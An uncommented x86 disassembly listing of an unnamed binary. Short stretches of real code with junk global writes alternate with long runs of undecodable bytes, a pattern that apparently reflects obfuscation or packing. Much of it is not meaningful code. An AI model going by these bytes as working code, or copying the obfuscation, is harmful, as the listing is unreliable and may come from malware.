  407b30:	jne    0x407efc
  407b36:	mov    ax,WORD PTR [ebp-0x8]
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x4337a3,0x4337e7
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433883,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x4337ab,0x4338a7
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x4338bb,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x43387b,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0xcaf6a3a4,al
  407ba8:	shr    dl,0xa
  407bab:	js     0x407b78
  407bad:	jle    0x407c2d
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407bf0
  407bb4:	jmp    0x1c937732
  407bb9:	pop    ds
  407bba:	cmp    BYTE PTR [edi+0x19],ah
  407bbd:	jl     0x407c06
  407bbf:	fiadd  WORD PTR [edi]
  407bc1:	pop    edi
  407bc2:	ins    BYTE PTR es:[edi],dx
  407bc3:	in     eax,0x83
  407bc5:	sbb    esi,DWORD PTR [edi-0x1c06e64f]
  407bcb:	fs inc esp
  407bcd:	mov    ebx,0x6ee6e0c4
  407bd2:	or     DWORD PTR [eax-0x58ffe95f],edx
  407bd8:	push   ss
  407bd9:	pop    edx
  407bda:	xor    eax,0xd6a03dae
  407bdf:	bound  ebp,QWORD PTR [edx]
  407be1:	inc    edx
  407be2:	jae    0x407bc9
  407be4:	mov    ch,0xa6
  407be6:	push   ecx
  407be7:	push   eax
  407be8:	xlat   BYTE PTR ds:[ebx]
  407be9:	mov    ds:0xb2c7d0d7,eax
  407bee:	jnp    0x407ba6
  407bf0:	pop    edi
  407bf1:	out    dx,eax
  407bf2:	pusha  
  407bf3:	ret    
  407bf4:	mov    ds:0x11abee,eax
  407bf9:	mov    al,0xf3
  407bfb:	xor    eax,0xf34a4d96
  407c00:	and    al,BYTE PTR [ebp+0x1b61051e]
  407c06:	(bad)  
  407c07:	loop   0x407c61
  407c09:	mov    edx,0xdee152ef
  407c0e:	jne    0x407c4b
  407c10:	inc    edx
  407c11:	xchg   edx,eax
  407c12:	dec    esi
  407c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c14:	(bad)  
  407c15:	loopne 0x407bce
  407c17:	and    edi,edx
  407c19:	fwait
  407c1a:	movntq (bad),mm5
  407c1b:	out    0xec,eax
  407c1d:	push   0xffffff99
  407c1f:	rcr    DWORD PTR [esi],cl
  407c21:	lock adc ecx,ecx
  407c24:	jno    0x407c79
  407c26:	arpl   di,si
  407c28:	push   esi
  407c29:	data16 mov bl,0xcb
  407c2c:	pop    ecx
  407c2d:	sbb    eax,0xf581e33c
  407c32:	leave  
  407c33:	or     eax,0x5b2669bf
  407c38:	and    eax,0xcdca1d79
  407c3d:	jecxz  0x407c7a
  407c3f:	push   ecx
  407c40:	mov    BYTE PTR [esi],bh
  407c42:	retf   
  407c43:	inc    ebx
  407c44:	(bad)  
  407c45:	sbb    BYTE PTR [edi],dh
  407c47:	push   es
  407c48:	or     al,0xc
  407c4a:	push   edx
  407c4b:	mov    ebp,0xfb58e913
  407c50:	cmc    
  407c51:	cdq    
  407c52:	sub    bh,BYTE PTR [ecx+edx*2+0x1d]
  407c56:	xor    eax,0xc8745747
  407c5b:	daa    
  407c5c:	mov    esi,DWORD PTR ss:[eax]
  407c5f:	aam    0x5d
  407c61:	jecxz  0x407ccd
  407c63:	ins    DWORD PTR es:[edi],dx
  407c64:	push   esi
  407c65:	adc    eax,0x304da4fe
  407c6a:	in     eax,dx
  407c6b:	out    0x45,al
  407c6d:	stos   BYTE PTR es:[edi],al
  407c6e:	push   esi
  407c6f:	in     al,dx
  407c70:	arpl   WORD PTR [edx+0x31bdcc24],si
  407c76:	pop    ds
  407c77:	xchg   DWORD PTR [edx+0x31],edx
  407c7a:	xor    edi,DWORD PTR [ebx+0x62]
  407c7d:	push   ds
  407c7e:	xchg   esi,eax
  407c7f:	cmp    eax,0xd8a77cd4
  407c84:	mov    ebp,0x6bb1d67f
  407c89:	scas   eax,DWORD PTR es:[edi]
  407c8a:	add    BYTE PTR [bx],dl
  407c8d:	lahf   
  407c8e:	mov    edx,0x1b81adc0
  407c93:	stos   DWORD PTR es:[edi],eax
  407c94:	fdivr  DWORD PTR [ebx+0x5fbb3af0]
  407c9a:	inc    edx
  407c9b:	(bad)  
  407c9c:	mov    ebx,0xed0f571c
  407ca1:	das    
  407ca2:	das    
  407ca3:	dec    ebx
  407ca4:	imul   eax,DWORD PTR [ebx],0x2b
  407ca7:	inc    ebx
  407ca8:	pop    edx
  407ca9:	add    al,0x20
  407cab:	cmp    dh,dh
  407cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cae:	int    0xd9
  407cb0:	addr16 ret 0xfdb1
  407cb4:	jp     0x407cad
  407cb6:	xchg   ecx,eax
  407cb7:	inc    ebp
  407cb9:	and    DWORD PTR [eax],esi
  407cbb:	adc    ch,BYTE PTR [ebx]
  407cbd:	cmp    eax,0xacb8f618
  407cc2:	cmp    ch,BYTE PTR [ebp+0x3332ec17]
  407cc8:	push   0xd33f2d8d
  407ccd:	dec    edi
  407cce:	sahf   
  407ccf:	inc    esi
  407cd0:	inc    esi
  407cd1:	or     DWORD PTR [ebx],ecx
  407cd3:	mov    eax,ds:0x1fe92e4
  407cd8:	xor    ebp,DWORD PTR [edi+0x6fba42a]
  407cde:	sub    cl,BYTE PTR [ebx+0x5ff2da85]
  407ce4:	fnstenv [edi+0x3aee2cb3]
  407cea:	lods   eax,DWORD PTR ds:[esi]
  407ceb:	popf   
  407cec:	jl     0x407c76
  407cee:	xchg   ecx,eax
  407cef:	adc    ebx,DWORD PTR [edi*4+0xcd4081c]
  407cf6:	cmp    bh,ch
  407cf8:	dec    ebp
  407cf9:	add    eax,0x2651486b
  407cfe:	das    
  407cff:	cs jne 0x407d29
  407d02:	out    dx,eax
  407d03:	pop    ecx
  407d04:	inc    ebx
  407d05:	std    
  407d06:	sar    DWORD PTR [eax],0x54
  407d09:	outs   dx,BYTE PTR ds:[esi]
  407d0a:	(bad)  
  407d0b:	push   esi
  407d0c:	out    dx,al
  407d0d:	xor    DWORD PTR [ecx+0x2d16c8e],ecx
  407d13:	mov    al,ds:0xcb1b7600
  407d18:	test   eax,0x2b01ddd8
  407d1d:	jmp    0x407d0a
  407d1f:	das    
  407d20:	add    edx,DWORD PTR [edi]
  407d22:	jge    0x407ce6
  407d24:	ins    BYTE PTR es:[edi],dx
  407d25:	add    dh,al
  407d27:	inc    ebx
  407d28:	mov    ecx,0xdfbd9e0b
  407d2d:	inc    ebp
  407d2e:	nop
  407d2f:	pop    ds
  407d30:	sbb    al,0x7d
  407d32:	les    esi,FWORD PTR [eax+0x4852a792]
  407d38:	jb     0x407d40
  407d3a:	out    dx,al
  407d3b:	shr    DWORD PTR [ebp-0x9122b97],0x54
  407d42:	in     eax,0x82
  407d44:	out    dx,al
  407d45:	and    bl,al
  407d47:	adc    BYTE PTR [esi-0x72],0x1a
  407d4b:	jg     0x407cf5
  407d4d:	and    cl,BYTE PTR [eax-0x47]
  407d50:	shl    BYTE PTR [edx-0x1e4e438a],0xd9
  407d57:	mov    ah,0xb4
  407d59:	dec    ebx
  407d5a:	mov    dh,0x7d
  407d5c:	mov    bl,0x1
  407d5e:	(bad)  
  407d5f:	xchg   ebp,eax
  407d60:	(bad)  
  407d61:	sub    eax,0xa3105ef4
  407d66:	mul    BYTE PTR [esi-0x7f]
  407d69:	xchg   ebx,eax
  407d6a:	xchg   edx,eax
  407d6b:	jbe    0x407da5
  407d6d:	adc    al,0x3d
  407d6f:	xor    esi,DWORD PTR [ebp+ebp*4+0x79]
  407d73:	cdq    
  407d74:	(bad)  
  407d75:	xor    al,ch
  407d77:	jmp    0xf954:0x3a0cdd41
  407d7e:	adc    ah,bl
  407d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d81:	outs   dx,DWORD PTR ds:[esi]
  407d83:	push   esp
  407d84:	enter  0xa153,0xab
  407d88:	and    ch,bh
  407d8a:	mov    edi,0x793a7fc2
  407d8f:	cmp    ch,BYTE PTR [eax-0x3c]
  407d92:	add    bh,BYTE PTR [esi+0x2d5161e9]
  407d98:	out    0x4b,al
  407d9a:	xor    DWORD PTR [eax],esi
  407d9c:	mov    ebp,0x2ca9e970
  407da1:	jge    0x407e0a
  407da3:	jns    0x407d5a
  407da5:	jns    0x407dd2
  407da7:	mov    ebp,0x6a98e301
  407dac:	xchg   ebx,eax
  407dad:	fistp  WORD PTR [ebx-0x74]
  407db0:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407db2:	pop    edx
  407db3:	test   eax,0x51e62d49
  407db8:	in     al,0xe2
  407dba:	cmp    al,0x10
  407dbc:	xchg   ecx,eax
  407dbd:	mov    esp,DWORD PTR [eax]
  407dbf:	push   ebp
  407dc0:	fadd   st,st(1)
  407dc2:	xchg   edi,eax
  407dc3:	sub    eax,ebx
  407dc5:	sbb    DWORD PTR [edx],ebp
  407dc7:	sbb    eax,0x21cde2
  407dcc:	in     eax,0x91
  407dce:	and    BYTE PTR [ebx-0x5119d04e],al
  407dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd5:	mov    edx,0x65c9d1fc
  407dda:	imul   edi
  407ddc:	les    ebp,FWORD PTR [edi+0x65]
  407ddf:	enter  0x5a2d,0x3b
  407de3:	and    DWORD PTR [esi+ebp*8+0x4e],ebp
  407de7:	addr16 loopne 0x407da2
  407dea:	inc    esi
  407deb:	ret    0xad52
  407dee:	mov    ds:0x38fc7551,eax
  407df3:	mov    ds:0x41a55491,al
  407df8:	mov    cl,0xae
  407dfa:	mov    WORD PTR [ecx+0x18],fs
  407dfd:	jns    0x407dfa
  407dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e00:	mov    al,0xf2
  407e02:	pushf  
  407e03:	xchg   DWORD PTR ss:[ecx+0x73],edx
  407e07:	inc    ecx
  407e08:	neg    BYTE PTR [ebx]
  407e0a:	xor    DWORD PTR [ecx-0x31e3d14e],ebx
  407e10:	jmp    0xdb4dc566
  407e15:	sti    
  407e16:	add    ebx,esp
  407e18:	(bad)  
  407e19:	ins    DWORD PTR es:[edi],dx
  407e1a:	xchg   esi,eax
  407e1b:	adc    DWORD PTR [ecx-0x79],edx
  407e1e:	outs   dx,BYTE PTR ds:[esi]
  407e1f:	es repnz mov esp,0x2299bc24
  407e26:	in     eax,0x11
  407e28:	push   eax
  407e29:	outs   dx,DWORD PTR ds:[esi]
  407e2a:	jg     0x407e20
  407e2c:	js     0x407df3
  407e2e:	xchg   ecx,eax
  407e2f:	xor    al,0xa7
  407e31:	rcl    ebp,0x8f
  407e34:	hlt    
  407e35:	inc    eax
  407e36:	and    dl,ch
  407e38:	mov    esp,0xca4011b3
  407e3d:	xor    dh,cl
  407e3f:	dec    esi
  407e40:	lea    ebp,ds:0xde2ceb73
  407e46:	lods   eax,DWORD PTR ds:[esi]
  407e47:	outs   dx,DWORD PTR ds:[esi]
  407e48:	jae    0x407e50
  407e4a:	(bad)  
  407e4b:	in     al,dx
  407e4c:	cmp    ebx,DWORD PTR gs:[ebp+0x1f]
  407e50:	sub    esi,DWORD PTR [edi-0x65159176]
  407e56:	jge    0x407ebb
  407e58:	jge    0x407df4
  407e5a:	(bad)  [edi]
  407e5c:	int3   
  407e5d:	xor    esi,DWORD PTR [ebx-0x61d73b02]
  407e63:	dec    ebx
  407e64:	lock imul eax,DWORD PTR [esi-0x20],0xba0736b3
  407e6c:	push   ebx
  407e6d:	popa   
  407e6e:	and    bh,0xd4
  407e71:	fild   QWORD PTR [edi]
  407e73:	stc    
  407e74:	inc    ecx
  407e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e77:	sbb    al,0x35
  407e79:	xor    eax,0x6a0aa43b
  407e7e:	aas    
  407e7f:	stos   BYTE PTR es:[edi],al
  407e80:	pushf  
  407e81:	dec    edx
  407e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e83:	rcl    BYTE PTR [eax+0x131056ba],cl
  407e89:	mov    al,BYTE PTR [edx]
  407e8b:	or     ebp,DWORD PTR [edx-0x421d4514]
  407e91:	std    
  407e92:	xchg   edx,eax
  407e93:	jp     0x407e33
  407e95:	popf   
  407e96:	daa    
  407e97:	adc    eax,0xdfabe9f2
  407e9c:	loop   0x407eee
  407e9e:	test   eax,0x98878773
  407ea3:	jns    0x407f24
  407ea5:	pop    ds
  407ea6:	cli    
  407ea7:	add    eax,0x5bf3973f
  407eac:	adc    dl,BYTE PTR [esi+0x38]
  407eaf:	inc    ecx
  407eb0:	dec    eax
  407eb1:	std    
  407eb2:	mov    dl,0x1b
  407eb4:	cmp    eax,0x48281c7f
  407eb9:	leave  
  407eba:	rol    edi,cl
  407ebc:	clc    
  407ebd:	idiv   BYTE PTR [ebx-0x5e64a25a]
  407ec3:	push   ecx
  407ec4:	imul   esi,DWORD PTR [ecx],0xffffff95
  407ec7:	out    0xaf,eax
  407ec9:	xchg   esi,eax
  407eca:	inc    esp
  407ecb:	jae    0x407ea9
  407ecd:	(bad)  
  407ecf:	pop    esi
  407ed0:	test   al,0xd2
  407ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ed3:	xor    ecx,DWORD PTR [ebx]
  407ed5:	jae    0x407f4c
  407ed7:	repnz in eax,0xb6
  407eda:	mov    DWORD PTR [ebp-0x2bd632b8],ebp
  407ee0:	xor    DWORD PTR gs:[ebp-0x4],0xe149eb8
  407ee8:	mov    ax,WORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x4337ef,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	xor    al,al
  407f1f:	ret    0x2ade
  407f22:	(bad)  
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	popf   
  407f2a:	out    0xbd,eax
  407f2c:	std    
  407f2d:	inc    edx
  407f2e:	xchg   esi,eax
  407f2f:	or     dh,BYTE PTR [edx-0x41]
  407f32:	js     0x407f87
  407f34:	and    eax,0x49d1d4d8
  407f39:	cdq    
  407f3a:	sbb    eax,0x3c32f3fc
  407f3f:	xchg   ecx,eax
  407f40:	int3   
  407f41:	fisubr DWORD PTR gs:[ebx]
  407f44:	cmp    ecx,ebx
  407f46:	rcl    DWORD PTR [ebx],0x79
  407f49:	pushf  
  407f4a:	or     dh,BYTE PTR [ecx+0x30fef539]
  407f50:	and    eax,0xd67f6f4
  407f55:	jmp    0x407f05
  407f57:	imul   eax,esi,0x984a0e73
  407f5d:	stc    
  407f5e:	cmp    DWORD PTR [edx+0x59],ebp
  407f61:	mov    WORD PTR [ecx+esi*1+0x27],es
  407f65:	adc    al,0xec
  407f67:	jo     0x407fc4
  407f69:	push   cs
  407f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f6b:	daa    
  407f6c:	xchg   DWORD PTR [esi+0x223d486e],edx
  407f72:	mov    esp,DWORD PTR [ecx-0x18]
  407f75:	test   ebx,ebx
  407f77:	mov    ch,0x3a
  407f79:	lods   eax,DWORD PTR ds:[esi]
  407f7a:	inc    edi
  407f7b:	push   ebx
  407f7c:	and    edx,ecx
  407f7e:	mov    bl,0xb0
  407f80:	mov    bl,0xbf
  407f82:	cmp    esp,DWORD PTR [edi]
  407f84:	retf   0x3733
  407f87:	sub    DWORD PTR [edx-0x555243bb],ecx
  407f8d:	lods   eax,DWORD PTR ds:[esi]
  407f8e:	push   es
  407f8f:	push   0x16
  407f91:	mov    al,0xa3
  407f93:	and    eax,DWORD PTR [eax]
  407f95:	jge    0x407ff5
  407f97:	inc    esp
  407f98:	sbb    al,0x5d
  407f9a:	outs   dx,DWORD PTR ds:[esi]
  407f9b:	or     esi,0xffffffa3
  407f9e:	and    esi,DWORD PTR [ecx-0x5118376e]
  407fa4:	mov    BYTE PTR ds:0x33f98857,ah
  407faa:	bound  esp,QWORD PTR [edi-0x34d9e1fe]
  407fb0:	cmp    al,0x58
  407fb2:	mov    esp,0xbdb5e839
  407fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fb8:	fadd   QWORD PTR [ebx+edi*2-0x5ddbd449]
  407fbf:	lods   eax,DWORD PTR ds:[esi]
  407fc0:	push   0x2b213c2
  407fc5:	jmp    0xba5ba4d7
  407fca:	test   eax,0x1dd0e7c5
  407fcf:	ja     0x407fc3
  407fd1:	xlat   BYTE PTR ds:[ebx]
  407fd2:	cmp    eax,0x19f0c800
  407fd7:	call   0xb106:0x13fb6acb
  407fde:	push   esp
  407fdf:	scas   al,BYTE PTR es:[edi]
  407fe0:	data16 and BYTE PTR ds:0x1dd93bab,ah
  407fe7:	daa    
  407fe8:	out    dx,eax
  407fe9:	fiadd  WORD PTR [eax+eiz*1+0x1b47e9ca]
  407ff0:	dec    esp
  407ff1:	mov    ebp,0x352c9c
  407ff6:	in     eax,0xeb
  407ff8:	arpl   WORD PTR [ecx-0x6f],si
  407ffb:	pop    edi
  407ffc:	mov    ebp,0xea26ca9a
  408001:	in     eax,dx
  408002:	icebp  
  408003:	xlat   BYTE PTR ds:[ebx]
  408004:	dec    edi
  408005:	div    BYTE PTR [ecx+0x5c]
  408008:	cld    
  408009:	pop    ds
  40800a:	stc    
  40800b:	pop    ecx
  40800c:	adc    esp,DWORD PTR [ebx+0x61416c83]
  408012:	push   ebp
  408013:	retf   
  408014:	(bad)  
  408015:	call   0xd154:0x5679ee87
  40801c:	fiadd  WORD PTR [edi-0x56]
  40801f:	mov    WORD PTR [ebx-0x41a6aab1],gs
  408025:	adc    al,0xee
  408027:	cmp    dl,BYTE PTR [bp-0x2b13]
  40802c:	pop    ss
  40802d:	jg     0x408060
  40802f:	rcl    esp,cl
  408031:	xor    bl,BYTE PTR [ebp+0x24]
  408034:	add    eax,ecx
  408036:	adc    al,0x96
  408038:	loopne 0x4080ad
  40803a:	loope  0x407fee
  40803c:	adc    edi,DWORD PTR [eax]
  40803e:	push   cs
  40803f:	and    al,dl
  408041:	test   DWORD PTR [esp+ebp*8-0x62],edx
  408045:	inc    eax
  408046:	push   0xa52b4285
  40804b:	xor    eax,0x6a8ad3b0
  408050:	mov    al,BYTE PTR [esi+0xb]
  408053:	stos   DWORD PTR es:[edi],eax
  408054:	lgs    ecx,FWORD PTR [edi+0x6ad929d9]
  40805b:	repz das 
  40805d:	push   ss
  40805e:	jp     0x40806e
  408060:	das    
  408061:	push   0x41e1fb85
  408066:	mov    ch,0x73
  408068:	sbb    dl,BYTE PTR [eax+0x1]
  40806b:	inc    ebp
  40806c:	jmp    0x40e080d0
  408071:	test   eax,0x88242d28
  408076:	fsub   DWORD PTR [edx]
  408078:	sbb    ebx,DWORD PTR [ebx+0x132dffff]
  40807e:	call   0x35d:0x5a90209
  408085:	xor    eax,0xde4d64c9
  40808a:	fbstp  TBYTE PTR [esi+0x20]
  40808d:	mul    DWORD PTR [ebx]
  40808f:	mov    al,0xb7
  408091:	jne    0x4080a2
  408093:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40809a:	inc    ecx
  40809b:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4080a2:	mov    eax,0x9577
  4080a7:	mov    ecx,DWORD PTR ds:0x4337a7
  4080ad:	xor    DWORD PTR ds:0x4338b3,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x4338b7
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x43387b
  4080d7:	add    ecx,DWORD PTR ds:0x43379b
  4080dd:	mov    DWORD PTR ds:0x43387b,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x4337e7,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433803,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43379f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x433833,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x433833
  40811b:	inc    eax
  40811c:	mov    ds:0x433833,eax
  408121:	cmp    DWORD PTR ds:0x433833,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x433833,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x433833,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x433833
  408158:	inc    eax
  408159:	mov    ds:0x433833,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x4337eb,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0x8296a38b
  40818c:	nop
  40818d:	nop
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	sub    eax,0x6594fb4d
  40819a:	xor    ecx,DWORD PTR [edi+0x79d2709d]
  4081a0:	addr16 pop eax
  4081a2:	in     al,dx
  4081a3:	jp     0x4081d2
  4081a5:	xor    eax,0x4db23799
  4081aa:	repnz pop ebp
  4081ac:	aaa    
  4081ad:	jbe    0x40817b
  4081af:	movntps XMMWORD PTR [edi+ecx*1+0x1cdd9abe],xmm7
  4081b7:	jp     0x4081e1
  4081b9:	in     eax,dx
  4081ba:	int3   
  4081bb:	cmp    DWORD PTR [ecx],eax
  4081bd:	ss popf 
  4081bf:	mov    ch,0xcb
  4081c1:	sbb    ch,bh
  4081c3:	dec    esp
  4081c4:	sti    
  4081c5:	push   cs
  4081c6:	pop    eax
  4081c7:	cmp    DWORD PTR [ecx],esp
  4081c9:	out    0x75,al
  4081cb:	out    dx,al
  4081cc:	stc    
  4081cd:	jmp    edx
  4081cf:	enter  0x3a39,0x81
  4081d3:	fld    QWORD PTR [esi+0x59]
  4081d6:	pusha  
  4081d7:	mov    eax,0x82990d8
  4081dc:	jl     0x4081e1
  4081de:	ret    0x2bd2
  4081e1:	add    BYTE PTR [ecx],bh
  4081e3:	out    0xa3,al
  4081e5:	xor    BYTE PTR [ebx+edi*1-0x46],0xb1
  4081ea:	pop    ecx
  4081eb:	jmp    0x4081cb
  4081ed:	push   ebx
  4081ee:	les    ecx,FWORD PTR [ecx]
  4081f0:	call   0x9b6e:0xde0d3d01
  4081f7:	and    DWORD PTR [edx+0x2d],eax
  4081fa:	hlt    
  4081fb:	pop    ebx
  4081fc:	mov    ebp,0x439c087d
  408201:	daa    
  408202:	stc    
  408203:	jle    0x40827f
  408205:	dec    edx
  408206:	mov    bl,0x3e
  408208:	push   esp
  408209:	stos   BYTE PTR es:[edi],al
  40820a:	dec    ebp
  40820b:	scas   eax,DWORD PTR es:[edi]
  40820c:	dec    ecx
  40820d:	aad    0x50
  40820f:	fild   DWORD PTR [ecx+0x762812a]
  408215:	aad    0x83
  408217:	in     eax,dx
  408218:	in     al,dx
  408219:	push   ecx
  40821a:	out    dx,eax
  40821b:	hlt    
  40821c:	loope  0x408251
  40821e:	xchg   ebp,eax
  40821f:	gs pushf 
  408221:	div    ebx
  408223:	cmp    BYTE PTR [edx+0x57a477f],cl
  408229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40822a:	daa    
  40822b:	loop   0x4081f4
  40822d:	fistp  QWORD PTR [edi-0x6b]
  408230:	out    0x33,eax
  408232:	jo     0x408234
  408234:	inc    ebx
  408235:	sbb    ch,BYTE PTR [ecx+0x63516f22]
  40823b:	aad    0x6b
  40823d:	jnp    0x40820f
  40823f:	int    0xe8
  408241:	xchg   ecx,eax
  408242:	mov    ds:0x91f1f7d2,al
  408247:	sbb    ebx,edi
  408249:	mov    esi,0x2c5945d7
  40824e:	xchg   ebp,eax
  40824f:	fnstsw ax
  408251:	jecxz  0x4081d9
  408253:	mov    BYTE PTR [edx+0x65],0x82
  408257:	ins    DWORD PTR es:[edi],dx
  408258:	pop    ds
  408259:	xchg   esi,eax
  40825a:	dec    ebp
  40825b:	and    ecx,DWORD PTR [ecx-0x571f6520]
  408261:	push   edi
  408262:	(bad)  
  408263:	pusha  
  408264:	int    0x8e
  408266:	fst    QWORD PTR [esi-0x54da13f4]
  40826c:	jmp    0x4082a3
  40826e:	push   0x23
  408270:	and    eax,DWORD PTR [eax+0x6b]
  408273:	and    esi,DWORD PTR [edi-0xbec99c3]
  408279:	mov    ch,0xff
  40827b:	inc    edx
  40827c:	lds    esi,FWORD PTR [edx-0xc5bf68b]
  408282:	in     eax,dx
  408283:	pop    esi
  408284:	call   0x80b6d22c
  408289:	rol    BYTE PTR [ebx-0x7c88301e],1
  40828f:	mov    ch,0xcb
  408291:	sub    eax,0x161a55e1
  408296:	inc    eax
  408297:	cld    
  408298:	lea    eax,[edx+0x7098e800]
  40829e:	popf   
  40829f:	jbe    0x408296
  4082a1:	cwde   
  4082a2:	es jmp 0xe41b:0x5646297b
  4082aa:	mov    dh,BYTE PTR [esi-0x623adc23]
  4082b0:	stos   BYTE PTR es:[edi],al
  4082b1:	jp     0x408317
  4082b3:	fimul  WORD PTR [edx]
  4082b5:	hlt    
  4082b6:	sahf   
  4082b7:	cwde   
  4082b8:	or     eax,0xdec57436
  4082bd:	jg     0x4082c0
  4082bf:	push   ebp
  4082c0:	sub    esi,DWORD PTR [edi+eiz*4+0x1fa14125]
  4082c7:	mov    al,0xbd
  4082c9:	lock cdq 
  4082cb:	add    al,0xa
  4082cd:	inc    ecx
  4082ce:	adc    bh,BYTE PTR [ecx+0x7c]
  4082d1:	cmp    eax,0xb711c582
  4082d6:	in     al,0x78
  4082d8:	pop    edi
  4082d9:	sbb    al,0x74
  4082db:	jbe    0x408310
  4082dd:	mov    cl,0x9
  4082df:	and    esi,DWORD PTR [ecx-0x1a9545cd]
  4082e5:	xor    BYTE PTR [esi],cl
  4082e7:	push   esi
  4082e8:	xor    BYTE PTR [ebp-0x7e],ch
  4082eb:	out    0xbb,eax
  4082ed:	or     BYTE PTR [eax+0x7efc3cb8],al
  4082f3:	xchg   ebx,eax
  4082f4:	jae    0x40829e
  4082f6:	das    
  4082f7:	xchg   ebx,eax
  4082f8:	test   al,0x46
  4082fa:	das    
  4082fb:	xor    edx,ecx
  4082fd:	test   al,0x72
  4082ff:	xor    eax,ecx
  408301:	and    DWORD PTR ds:0x4337ff,0x1370
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x4337a3,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x43382f,0x4338c3
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x43383f,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x4337fb,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43379b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x43387f,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x4337f3,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0x8001c6ea
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x408350
  40838a:	in     eax,0xc6
  40838c:	inc    edx
  40838d:	or     eax,0x2e3a7bc5
  408392:	jne    0x408328
  408394:	loope  0x4083d6
  408396:	push   eax
